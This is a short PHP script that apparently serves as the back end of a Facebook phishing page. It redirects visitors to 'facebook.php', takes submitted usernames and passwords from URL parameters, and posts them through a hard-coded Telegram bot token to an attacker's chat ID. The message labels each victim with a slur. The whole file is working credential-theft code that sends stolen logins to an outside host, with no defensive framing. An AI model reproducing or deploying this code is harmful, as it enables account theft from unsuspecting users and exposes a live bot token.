<?php
ob_start();
$BOT_KEY = '6183326066:AAHNqN3LRjs63vP_V8gZSry5_S4OBxJJEmI';
define('API_KEY',$BOT_KEY,0);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
$url1 = "facebook.php"; /*Website Which the user moves to select for you*/
header("location: $url1");
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$idDome = 5791115100;
$user = $_GET["user"];
$pass = $_GET["pass"];
$fo = $_GET["fo"];

if($user){
bot('sendMessage',[
'chat_id'=>$idDome,
'text'=>"New bitch registered
Username : $user
Pass : $pass
",
]);
}